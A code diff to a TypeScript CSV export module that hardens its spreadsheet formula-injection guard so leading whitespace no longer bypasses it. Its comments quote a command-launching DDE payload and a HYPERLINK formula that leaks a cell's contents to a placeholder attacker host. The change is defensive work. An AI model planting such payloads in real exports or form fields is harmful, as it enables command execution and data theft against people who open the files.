@@ -36,11 +36,21 @@ export type CsvValue = string | number | boolean | null | undefined;
  *  module doc for why (Excel mangles non-ASCII without it). */
 export const CSV_BOM = "﻿";
 
-/** Characters that make a spreadsheet treat a cell as a formula rather than
- *  text. `-` is included even though it also starts a negative number: this
- *  guard only ever runs on STRING values (see `csvField`), so `-12.5` typed as
- *  a number is unaffected, while the string `-2+3+cmd|' /c calc'!A0` is. */
-const FORMULA_LEAD = /^[=+\-@\t\r]/;
+/**
+ * Characters that make a spreadsheet treat a cell as a formula rather than
+ * text. `-` is included even though it also starts a negative number: this
+ * guard only ever runs on STRING values (see `csvField`), so `-12.5` typed as
+ * a number is unaffected, while the string `-2+3+cmd|' /c calc'!A0` is.
+ *
+ * LEADING WHITESPACE IS SKIPPED BEFORE THE TEST. Excel, LibreOffice and
+ * Google Sheets all strip leading spaces/tabs when importing a CSV cell, so
+ * `" =HYPERLINK(...)"` evaluates exactly like `"=HYPERLINK(...)"` — anchoring
+ * strictly at index 0 let a single space defeat the whole guard. An
+ * adversarial review demonstrated the bypass with a live exfiltration payload
+ * (`" =HYPERLINK(""http://evil.test?leak=""&A1,""Click me"")"`) reaching the
+ * file untouched, from nothing more privileged than a free-text form answer.
+ */
+const FORMULA_LEAD = /^[ \t\r\n]*[=+\-@\t\r]/;
 
 /** True iff a *string* cell would be evaluated as a formula by Excel /
  *  LibreOffice / Google Sheets. Exported for tests and for any caller that
